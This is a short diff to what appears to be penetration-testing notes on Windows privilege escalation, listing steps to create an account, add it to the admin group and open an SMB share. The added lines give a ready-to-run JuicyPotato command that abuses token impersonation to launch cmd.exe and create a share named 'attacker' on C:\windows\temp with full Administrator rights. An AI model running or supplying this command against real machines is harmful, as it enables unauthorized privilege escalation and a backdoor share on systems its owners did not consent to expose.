@@ -23,4 +23,6 @@ CREATE AN ACCOUNT ,
 ADD THAT ACCOUNT TO ADMIN GROUP , 
 CREATE A NEW SMB SHARE AND GRANT ADMIN RIGHTS TO THAT SHARE*
 
-
+```CMD
+Juicypotato -t * -p C:\windows\system32\cmd.exe -a "/c net share attacker=C:\windows\temp /GRANT:Administrator,FULL" -l 1337
+```
